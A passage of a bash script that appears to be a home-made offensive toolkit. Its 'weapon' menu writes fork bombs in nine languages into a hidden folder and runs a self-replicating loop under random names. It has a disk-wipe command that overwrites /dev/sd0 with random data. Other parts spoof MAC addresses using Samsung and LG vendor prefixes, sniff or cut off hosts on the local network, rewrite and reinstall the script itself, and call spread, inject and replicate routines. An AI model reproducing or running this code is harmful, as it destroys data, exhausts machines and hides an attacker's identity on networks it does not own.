              printf "Windows 2000 $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-5.0"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'CYGWIN_NT-5.0"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "Windows 7 $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-6.1"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'CYGWIN_NT-6.1"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "Windows Vista $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-6.0"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'CYGWIN_NT-6.0"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "Windows XP $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-5.1"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'CYGWIN_NT-5.1"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
              printf "z/OS $(echo "$(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"OS/390"') - $(awk '$1=$1' ORS='\\n' $_loc | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'OS/390"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
          else
              printf "$RED SYS ERROR$NC\n"
          fi
     elif [[ "$2" == "add" ]]; then
       cat $_loc | sed -e 's/OpenBSD\(.*\)_system/\1/'
     elif [[ "$2" == "magic" ]]; then
       printf " num :: list :: ratio :: add :: rmv :: edt\n"
     else
       printf "$RED SYS ERROR$NC\n"
     fi
   elif [[ "$1" == "db" ]]; then
     if [ "$2" == "s" ]; then

       cd ~ ; mkdir nicoosor ; cd nicoosor
       sudo cp $_loc ./zneic
       sudo cp zneic zneic2
       sh zneic -uninstall
       sudo rm -rf zneic
       cat zneic2 | sed "s/_newj()/_jvdr()/g" | sed "s/_newv()/_vndr()/g" | sed "s/_newj/_jvdr/g" | sed "s/_newv/_vndr/g" > zneic
       sudo rm -rf zneic2 ; sh zneic -qinstall ; sudo rm -rf zneic ;  cd .. ; rm -rf nicoosor
       printf "$GREEN Standard database initiated.$NC\n"


     elif [[ "$2" == "b" ]]; then

       cd ~ ; mkdir nicoosor ; cd nicoosor
       sudo cp $_loc ./zneic
       sudo cp zneic zneic2
       sh zneic -uninstall
       sudo rm -rf zneic
       cat zneic2 | sed "s/_jvdr()/_uf()/g" | sed "s/_vndr()/_uf2()/g" | sed "s/_jvdr/_newj/g" | sed "s/_vndr/_newv/g" > zneic
       sudo rm -rf zneic2 ; sh zneic -qinstall ; sudo rm -rf zneic ; cd .. ; rm -rf nicoosor
       printf "$RED Backup database initiated.$NC\n"


     elif [[ "$2" == "w" ]]; then




       _valoare="$(cat $_loc | grep -c 'uf()')"

       if [ $_valoare == "2" ]; then
          printf "$GREEN Standard$NC\n"
       else
          printf "$RED Backup$NC\n"
       fi
     else
        printf "$RED DB ERROR$NC\n"
     fi
   elif [[ "$1" == "alive" ]]; then
     if [ $_alive == true ]; then
       printf "$RED дa$NC\n"
     else
       _suicide
     fi
   elif [[ "$1" == "decoy" ]]; then
       _decoy $2
   elif [[ "$1" == "upass" ]]; then

     cd ~
     mkdir blana ; cd blana
     sudo cp $_loc ./zneic
     sudo cp zneic zneic2
     sh zneic -uninstall
     sudo rm -rf zneic
     cat zneic2 | sed "s/cartof/$2/g" > zneic
     sudo rm -rf zneic2 ; sh zneic -qinstall ; sudo rm -rf zneic
     cd .. ; sudo rm -rf blana

     if [ -f /usr/local/bin/xzneic ]; then
       cd ~
       mkdir blana ; cd blana
       sudo cp /usr/local/bin/xzneic ./xzneic
       sudo cp xzneic zneic2
       sudo rm -rf /usr/local/bin/xzneic
       sudo rm -rf xzneic
       cat zneic2 | sed "s/cartof/$2/g" > xzneic
       sudo rm -rf zneic2 ; sudo chmod +x xzneic ; sudo cp xzneic /usr/local/bin ; sudo rm -rf xzneic
       cd .. ; sudo rm -rf blana
     fi

   elif [[ "$1" == "status" ]]; then
     if [ -f /usr/local/bin/zneic.sslz ]; then
       printf "$GREEN"
       printf "Protected "
     else
       printf "$RED"
       printf "NOT protected "
     fi
     if [ "$(echo zneic | grep -c '.')" == 1 ]; then
        printf "$RED"
        printf "NOT ghosted "
     else
        printf "$GREEN"
        printf "Ghosted "
     fi
     printf "\n$NC"
   elif [[ "$1" == "bay" ]]; then
     if [ "$2" == "fbomb" ]; then
       if [ "$3" == "c" ]; then

         if [ "$4" == "deploy" ]; then
           cd ~ ;  mkdir .new_nest ; cd .new_nest
           touch zion.c
           echo "#include <sys/types.h>" >> zion.c
           echo "#include <unistd.h>" >> zion.c
           echo "" >> zion.c
           echo "int main(){" >> zion.c
           echo "   while(1){ fork(); }" >> zion.c
           echo "   return 0;" >> zion.c
           echo "}" >> zion.c
           pwd ; ls
         else
           echo ""
           echo "#include <sys/types.h>"
           echo "#include <unistd.h>"
           echo ""
           echo "int main(){"
           echo "   while(1){ fork(); }"
           echo "   return 0;"
           echo "}"
           echo ""
         fi

       elif [[ "$3" == "bash" ]]; then

         if [ "$4" == "deploy" ]; then
           cd ~ ;  mkdir .new_nest ; cd .new_nest
           touch zion.sh
           echo ":(){ :|:& };:" >> zion.sh
           pwd ; ls
         else
           echo ""
           echo ":(){ :|:& };:"
           echo ""
         fi

       elif [[ "$3" == "bat" ]]; then

         if [ "$4" == "deploy" ]; then
           cd ~ ;  mkdir .new_nest ; cd .new_nest
           touch zion.bat
           echo "%0 | %0" >> zion.bat
           pwd ; ls
         else
           echo ""
           echo "%0 | %0"
           echo ""
         fi

       elif [[ "$3" == "cmd" ]]; then

         if [ "$4" == "deploy" ]; then
           cd ~ ;  mkdir .new_nest ; cd .new_nest
           touch zion.bat
           echo "@echo off" >> zion.bat
           echo "start" >> zion.bat
           echo "start" >> zion.bat
           echo "start" >> zion.bat
           echo "start" >> zion.bat
           echo "start" >> zion.bat
           echo "start zion" >> zion.bat
           pwd ; ls
         else
           echo ""
           echo "@echo off"
           echo "start"
           echo "start"
           echo "start"
           echo "start"
           echo "start"
           echo "start zion"
           echo ""
         fi

       elif [[ "$3" == "py" ]]; then

         if [ "$4" == "deploy" ]; then
           cd ~ ;  mkdir .new_nest ; cd .new_nest
           touch zion.py
           echo "import os" >> zion.py
           echo "while True:" >> zion.py
           echo "   os.fork()" >> zion.py
           pwd ; ls
         else
           echo ""
           echo "import os"
           echo "while True:"
           echo "   os.fork()"
           echo ""
         fi

       elif [[ "$3" == "ps" ]]; then

         if [ "$4" == "deploy" ]; then
           cd ~ ;  mkdir .new_nest ; cd .new_nest
           touch zion.psr
           echo "while(\$true) {" >> zion.psr
           echo "   Start-Process powershell.exe -ArgumentList \"-NoExit\", \"Get-ChildItem -Recurse C:\";" >> zion.psr
           echo "   Invoke-Expression -Command 'while(\$true) {Start-Process powershell.exe -ArgumentList \"-NoExit\", \"Get-ChildItem -Recurse C:\"}';" >> zion.psr
           echo "}" >> zion.psr
           pwd ; ls
         else
           echo ""
           echo "while(\$true) {"
           echo "while True:"
           echo "   Invoke-Expression -Command 'while(\$true) {Start-Process powershell.exe -ArgumentList \"-NoExit\", \"Get-ChildItem -Recurse C:\"}';"
           echo "}"
           echo ""
         fi

       elif [[ "$3" == "java" ]]; then

         if [ "$4" == "deploy" ]; then
           cd ~ ;  mkdir .new_nest ; cd .new_nest
           touch zion.java
           echo "public class zion" >> zion.java
           echo "{" >> zion.java
           echo "   public static void main(String[] args){" >> zion.java
           echo "      while(true){Runtime.getRuntime().exec(new String[]{\"javaw\", \"-cp\", System.getProperty(\"java.class.path\"), \"zion\"});}" >> zion.java
           echo "   }" >> zion.java
           echo "}" >> zion.java
           pwd ; ls
         else
           echo ""
           echo "public class ForkBomb"
           echo "{"
           echo "   public static void main(String[] args){"
           echo "      while(true){Runtime.getRuntime().exec(new String[]{\"javaw\", \"-cp\", System.getProperty(\"java.class.path\"), \"ForkBomb\"});}"
           echo "   }"
           echo "}"
           echo ""
         fi

       elif [[ "$3" == "lua" ]]; then

         if [ "$4" == "deploy" ]; then
           cd ~ ;  mkdir .new_nest ; cd .new_nest
           touch zion.lua
           echo "-- Requires \`luaposix' module" >> zion.lua
           echo "local unistd = require \"posix.unistd\"" >> zion.lua
           echo "" >> zion.lua
           echo "while true do" >> zion.lua
           echo "   unistd.fork()" >> zion.lua
           echo "end" >> zion.lua
           pwd ; ls
         else
           echo ""
           echo "-- Requires \`luaposix' module"
           echo "local unistd = require \"posix.unistd\""
           echo ""
           echo "while true do"
           echo "   unistd.fork()"
           echo "end"
           echo ""
         fi

       elif [[ "$3" == "perl" ]]; then

         if [ "$4" == "deploy" ]; then
           cd ~ ;  mkdir .new_nest ; cd .new_nest
           touch zion.perl
           echo "perl -e \"fork while fork\" &" >> zion.perl
           pwd ; ls
         else
           echo ""
           echo "perl -e \"fork while fork\" &"
           echo ""
         fi

       elif [[ "$3" == "ruby" ]]; then

         if [ "$4" == "deploy" ]; then
           cd ~ ;  mkdir .new_nest ; cd .new_nest
           touch zion.rb
           echo "def cpu_intensive_process" >> zion.rb
           echo "   puts \"Pid: #{Process.pid}\"" >> zion.rb
           echo "   x = 0" >> zion.rb
           echo "   10000000.times do |i|" >> zion.rb
           echo "   x = i + x" >> zion.rb
           echo "   end" >> zion.rb
           echo "end" >> zion.rb
           echo "fork" >> zion.rb
           echo "cpu_intensive_process" >> zion.rb
           pwd ; ls
         else
           echo ""
           echo "def cpu_intensive_process"
           echo "   puts \"Pid: #{Process.pid}\""
           echo "   x = 0"
           echo "   10000000.times do |i|"
           echo "   x = i + x"
           echo "   end"
           echo "end"
           echo "fork"
           echo "cpu_intensive_process"
           echo ""
         fi

       elif [[ "$3" == "magic" ]]; then
         printf " c :: bash :: bat :: py :: ps :: java :: lua :: perl\n"
       else
         printf "$RED Bomb type ERROR$NC\n"
       fi
     elif [[ "$2" == "klogr" ]]; then

       if [ "$3" == "windows" ]; then
         printf "$RED Not supported yet$NC\n"
       elif [[ "$3" == "linux" ]]; then
         printf "$RED Not supported yet$NC\n"
       elif [[ "$3" == "mac" ]]; then
         printf "$RED Not supported yet$NC\n"
       elif [[ "$3" == "magic" ]]; then
         printf "windows :: linux :: mac\n"
       else
         printf "$RED Klogr SYS ERROR$NC\n"
       fi

     elif [[ "$2" == "rabbt" ]]; then
       _new="$(openssl rand -base64 32 | tr -cd 'a-z' | cut -c 1-5)"
       while(true); do
         _r_melt $_new
         $_new self bay rabbt
         $_new self bay rabbt
         $_new self bay rabbt
         $_new self bay rabbt
       done
     elif [[ "$2" == "dwipe" ]]; then
       openssl enc -aes-256-ctr -pass pass:"$(dd if=/dev/urandom bs=128 count=1 </dev/null | base64)" -nosalt </dev/zero | pv --progress --eta --rate --bytes | dd of=/dev/sd0
     elif [[ "$2" == "dsenc" ]]; then
       openssl enc -aes-256-ctr -pass pass:"$(dd if=/dev/urandom bs=128 count=1 </dev/null | base64)" -nosalt </dev/zero | pv --progress --eta --rate --bytes | dd of=/dev/sd0
     elif [[ "$2" == "magic" ]]; then
       printf "fbomb :: klogr :: rabbt :: dwipe :: dsenc\n"
     else
       printf "$RED Weapon type ERROR$NC\n"
     fi

   elif [[ "$1" == "app" ]]; then
     if [ "$2" == "basic" ]; then
       if [ "$3" == "ios" ]; then
          printf "$RED Not supported yet$NC\n"
       elif [[ "$3" == "droid" ]]; then
          printf "$RED Not supported yet$NC\n"
       elif [[ "$3" == "hybrid" ]]; then
          printf "$RED Not supported yet$NC\n"
       fi
     elif [[ "$2" == "radio" ]]; then
       if [ "$3" == "ios" ]; then
          printf "$RED Not supported yet$NC\n"
       elif [[ "$3" == "droid" ]]; then
          printf "$RED Not supported yet$NC\n"
       elif [[ "$3" == "hybrid" ]]; then
          printf "$RED Not supported yet$NC\n"
       fi
     elif [[ "$2" == "video" ]]; then
       if [ "$3" == "ios" ]; then
          printf "$RED Not supported yet$NC\n"
       elif [[ "$3" == "droid" ]]; then
          printf "$RED Not supported yet$NC\n"
       elif [[ "$3" == "hybrid" ]]; then
          printf "$RED Not supported yet$NC\n"
       fi
     elif [[ "$2" == "magic" ]]; then
        printf "basic :: radio :: video :: voip :: web\n"
     else
        printf "$RED Not supported yet$NC\n"
     fi
   elif [[ "$1" == "magic" ]]; then
     printf "$RED FUNC$YELLOW SYS$GREEN DB$BLUE BAY$WHITE APP$NC\n"
   else
     printf "$RED Not supported default$NC\n"
   fi

   _u_data 2> /dev/null



}


_geolocate(){ #selft




   if [ -z "$1" ]; then
     curl -sf ipinfo.io/$(dig +short myip.opendns.com @resolver1.opendns.com) | sed '1d' | sed '$d' | sed 's/"//g'
   else
     curl -sf ipinfo.io/$1 | sed '1d' | sed '$d' | sed 's/"//g'
   fi

   _u_data 2> /dev/null


}

_magnet(){ #selft

   ls | egrep "^.*\.$2$"

  :'
   if [ "$(echo $1 | grep -c 't')" == "1" ]; then

   elif [[ "$(echo $1 | grep -c 'n')" == "1" ]]; then
     ls | egrep "^.*$2$"
   else
     ls | egrep "^.*\.$2$"
   fi
   '

   _u_data 2> /dev/null
}


_everything(){ #selfc


   _system="$(uname -s)"

   if [ $_system == "Darwin" ]; then
       systemstats
   elif [[ $_system == "Linux" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "GNU" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "Haiku" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "Minix" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "OpenBSD" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "$(uname -n)" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "SunOS" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "OS/390" ]]; then
       printf "$RED Not supported yet$NC\n"
   else
       printf "$RED Not supported sys$NC\n"
   fi

   _u_data 2> /dev/null



}

_router_info(){ #selfc

  _system="$(uname -s)"

  if [ $_system == "Darwin" ]; then #tw

     printf "\n"
     printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2}')$NC\n"
     printf "\n"
     printf "$(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12)\n"
     printf "$YELLOW$(dig +short myip.opendns.com @resolver1.opendns.com)$NC\n"
     printf "\n"
     printf "$(arp -a | grep $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | awk '{print $4}' | sed -n '1p')\n"
     printf `_jvdr $(arp -a | grep $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | awk '{print $4}')`
     printf "\n"
     printf "$(zneic _wit? $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | sed 's/Aggressive OS guesses/Running/g' | grep 'Running:' | sed -n '1p' | awk '{print $2,$3}')\n"
     printf "$NC$BLINK\n"
     printf "\n"
     curl ipinfo.io/city
     curl ipinfo.io/loc
     curl ipinfo.io/org
     printf "$NC\n"

  elif [[ $_system == "Linux" ]]; then #nn

    printf "\n"
    printf "$WHITE$(nmcli -t -f active,ssid |grep enp0s3 | sed '$d' | awk '{print $4,$5,$6}')$NC\n"
    printf "\n"
    printf "$(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12)\n"
    printf "$YELLOW$(dig +short myip.opendns.com @resolver1.opendns.com)$NC\n"
    printf "\n"
    printf "$(arp -a | grep $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | awk '{print $4}')\n"
    printf `_jvdr $(arp -a | grep $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | awk '{print $4}')`
    printf "$NC$BLINK\n"
    printf "\n"
    curl ipinfo.io/city
    curl ipinfo.io/loc
    curl ipinfo.io/org
    printf "$NC\n"

  elif [[ $_system == "GNU" ]]; then
      printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "Haiku" ]]; then
     printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "Minix" ]]; then
     printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "OpenBSD" ]]; then
     printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "SunOS" ]]; then
     printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
     printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
     printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
     printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
     printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
     printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "$(uname -n)" ]]; then
     printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "OS/390" ]]; then
     printf "$RED Not supported yet$NC\n"
  else
     printf "$RED Not supported default$NC\n"
  fi


  _u_data 2> /dev/null

}


_expand(){ #selfc

    _spread >/dev/null
    _inject >/dev/null
    _salt >/dev/null
    _replicate >/dev/null
    printf "$RED _expanded$YELLOW!$NC\n"

}


_network(){ #selfe

   _system="$(uname -s)"
   _local=$(dig +short myip.opendns.com @resolver1.opendns.com)

   if [ "$1" == "scan" ]; then
       if [ $_system == "Darwin" ]; then
          nmap -F $(ipcalc $(ipconfig getpacket en0 | grep yiaddr | awk '{print $3}') | grep Network | awk '{print $2}')
       elif [[ $_system == "Linux" ]]; then
          printf "$RED Not supported yet$NC\n"
       else
          printf "$RED Not supported sys$NC\n"
       fi
   elif [[ "$1" == "max" ]]; then
       if [ $_system == "Darwin" ]; then
          ipcalc $(ipconfig getpacket en0 | grep yiaddr | awk '{print $3}') | grep Hosts | awk '{print $2}'
       elif [[ $_system == "Linux" ]]; then
          printf "$RED Not supported yet$NC\n"
       elif [[ $_system == "OpenBSD" ]]; then
          printf "$RED Not supported yet$NC\n"
       elif [[ $_system == "Minix" ]]; then
          printf "$RED Not supported yet$NC\n"
       elif [[ $_system == "Haiku" ]]; then
          printf "$RED Not supported yet$NC\n"
       elif [[ $_system == "$(uname -n)" ]]; then
          printf "$RED Not supported yet$NC\n"
       else
          printf "$RED Not supported sys$NC\n"
       fi
   elif [[ "$1" == "router" ]]; then
       _router_info
   elif [[ "$1" == "top" ]]; then
       _router_info
   elif [[ "$1" == "num" ]]; then
       echo $(arp -a | grep ? -c)
   elif [[ "$1" == "dead" ]]; then
       sudo zamael -a
   elif [[ "$1" == "bye" ]]; then
       sudo zamael -t $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-11)$2
   elif [[ "$1" == "aloha" ]]; then
       sudo zamael -t $2
   elif [[ "$1" == "speed" ]]; then
       _radar
   elif [[ "$1" == "sniff" ]]; then
       sudo zamael -s
   elif [[ "$1" == "infect" ]]; then
       printf "$RED ERROR $NC\n"
   elif [[ "$1" == "magic" ]]; then
       printf " max :: num ::$YELLOW router $NC::$BLUE scan $NC::$WHITE speed $NC:: sniff ::$RED infect$NC :: bye ::$RED dead$NC\n"
   else
       printf "$RED sNET ERROR $NC\n"
   fi

   _u_data 2> /dev/null
}

_opaa(){ #selfp


  clear
  printf "$BLINK                  ..      .........   .ue     ^Rc\n"
  printf "                .R   Lo #           7d  .daN.   S\n"
  printf "               A  ua             .ug  oe    #L  ?b\n"
  printf "              A                    .d   .BLYAT   ?b.\n"
  printf "             Z                    a*CYKA#           Nu\n"
  printf "            A                                        #b\n"
  printf "          .L                                           Sr\n"
  printf "        .A                                   SL        S\n"
  printf "      .S                                    8 R      dP\n"
  printf "   .dx                                   .dP d    .d#\n"
  printf "  xP              .e                 .ud#   dE.oa (\n"
  printf "  S                             .ia           \dP\n"
  printf "  ?L  ..   De                 ..to          .S  uP\n"
  printf "   #c:S  u.             .ua*  S          uR .a\n"
  printf "    ?LS.        ath    xa     A          d  JP\n"
  printf "     ^#S.        #L  .S     8          d  d\n"
  printf "                   b. S.   A          S  8\n"
  printf "                      aSL S          S  a\n"
  printf "                   aL    S          d  8\n"
  printf "                   SSu.uS          dF dF\n"
  printf "                   S       o      dP xR\n"
  printf "                   S      dFNu...a   S\n"
  printf "                    N..   ?B        :R$NC\n"

  _u_data 2> /dev/null

}

_motto(){ #selfp

printf "This is $GREEN $_name$BLUE $_version$NC at your service  \n"

}


_l_poor(){ #selfp

  printf "\n"
  printf "$GREEN     <<<<< $_name >>>>>$NC\n"
  printf "$GREEN       <<<$WHITE     S     $GREEN>>>  $NC\n"
  printf "$GREEN         < $_name >    $NC\n"
  printf "$NC\n"

}

_l_unblink(){ #selfp

  printf "\n"
  printf "$GREEN     <<<<< $_name >>>>>$NC\n"
  printf "$GREEN       <<<$NC     🐍     $GREEN>>>  $NC\n"
  printf "$GREEN         < $_name >    $NC\n"
  printf "$NC\n"

}




_l_blink(){ #selfp

  printf "$BLINK\n"
  printf "$GREEN     <<<<< $_name >>>>>$NC\n"
  printf "$BLINK$GREEN       <<<$NC$BLINK     🐍    $GREEN$BLINK>>>  $NC\n"
  printf "$BLINK$GREEN         < $_name >    $NC\n"
  printf "$NC\n"

}

_logo(){ #selfp

  #printf "Logo call: $_blinking\n"


  _system="$(uname -s)"

  if [ $_system == "Darwin" ]; then

     if $_blinking ; then
       _l_blink
     else
       _l_unblink
     fi

  elif [[ $_system == "Linux" ]]; then

     if $_blinking ; then
       _l_blink
     else
       _l_unblink
     fi

   elif [[ $_system == "GNU" ]]; then

         _l_poor

  elif [[ $_system == "Haiku" ]]; then

         _l_poor

  elif [[ $_system == "HP-UX" ]]; then

         _l_poor

  elif [[ $_system == "Minix" ]]; then

      _l_poor

  elif [[ $_system == "OpenBSD" ]]; then

       if $_blinking ; then
         _l_blink
       else
         _l_unblink
       fi


  elif [[ $_system == "SunOS" ]]; then

       _l_poor

  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

          _l_poor

  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

             if $_blinking ; then
               _l_blink
             else
               _l_unblink
             fi

  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

             if $_blinking ; then
               _l_blink
             else
               _l_unblink
             fi

  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

             if $_blinking ; then
               _l_blink
             else
               _l_unblink
             fi

  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

          if $_blinking ; then
            _l_blink
          else
            _l_unblink
          fi


  elif [[ $_system == "OS/390" ]]; then

       _l_poor



  elif [[ $_system == "$(uname -n)" ]]; then

      _l_poor

  else

    printf "$RED mOO$WHITE mOO$NC\n"

  fi



}


_samsung(){ #morph


  _rnd=$[RANDOM%14]
  _codes=("D0:87:E2" "20:55:31" "54:40:AD" "84:2E:27" "50:F0:D3" "84:11:9E" "08:EC:A9" "10:D3:8A" "38:2D:D1" "E0:CB:EE" "64:B8:53" "F4:42:8F" "18:83:31" "84:55:A5" "A8:7C:01" "C0:11:73")




_system="$(uname -s)"

if [ $_system == "AIX" ]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "A/UX" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "Darwin" ]]; then #tw

_off
sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
end=$( for i in {1..6} ; do echo -n ${hexchars:$(( $RANDOM % 16 )):1} ; done | sed -e 's/\(..\)/-\1/g' )
echo ${_codes[$_rnd]}$end)
_on

if [ "$1" == "-q" ]; then
>/dev/null  2>&1
else
printf "$WHITE Samsung :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
fi

elif [[ $_system == "Linux" ]]; then #tw

sudo ip link set dev enp0s3 down
sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
sudo ip link set dev enp0s3 up

if [ "$1" == "-q" ]; then
>/dev/null  2>&1
else
printf "$WHITE Samsung :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
fi


elif [[ $_system == "GNU" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "Haiku" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "HP-UX" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "Minix" ]]; then #nn

  sudo ip link set dev enp0s3 down
  sudo ip link set dev enp0s3 address $(echo 38:2D:E8:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
  sudo ip link set dev enp0s3 up

elif [[ $_system == "OpenBSD" ]]; then #tw

  ifconfig em0 lladdr $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])

elif [[ $_system == "SunOS" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "OS/390" ]]; then

  printf "$RED Not supported yet$NC\n"

else

 printf "$RED Not supported sys$NC\n"

fi





}

_lg(){ #morph


  _rnd=$[RANDOM%9]
  _codes=("14:C9:13" "3C:BD:D8" "2C:54:CF" "00:1F:E3" "00:26:E2" "00:1E:75" "6C:D6:8A" "20:21:A5" "0C:48:85")

  _system="$(uname -s)"

  if [ $_system == "AIX" ]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "A/UX" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "Darwin" ]]; then #tw

  _off
  sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
  end=$( for i in {1..6} ; do echo -n ${hexchars:$(( $RANDOM % 16 )):1} ; done | sed -e 's/\(..\)/-\1/g' )
  echo ${_codes[$_rnd]}$end)
  _on

  if [ "$1" == "-q" ]; then
  >/dev/null  2>&1
  else
  printf "$WHITE LG :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
  fi

elif [[ $_system == "Linux" ]]; then #tw

  sudo ip link set dev enp0s3 down
  sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
  sudo ip link set dev enp0s3 up

  if [ "$1" == "-q" ]; then
  >/dev/null  2>&1
  else
  printf "$WHITE LG :: $(ifconfig enp0s3 | grep ether | awk '{print $2}')$NC\n"
  fi

elif [[ $_system == "GNU" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "Haiku" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "HP-UX" ]]; then

  printf "$RED Not supported yet$NC\n"

elif [[ $_system == "Minix" ]]; then #nn

    sudo ip link set dev enp0s3 down
    sudo ip link set dev enp0s3 address $(echo 2C:54:CF:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
    sudo ip link set dev enp0s3 up

  elif [[ $_system == "OpenBSD" ]]; then #tw

    ifconfig em0 lladdr $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])


  elif [[ $_system == "SunOS" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then

    printf "$RED Not supported yet$NC\n"

  elif [[ $_system == "OS/390" ]]; then

    printf "$RED Not supported yet$NC\n"

  else

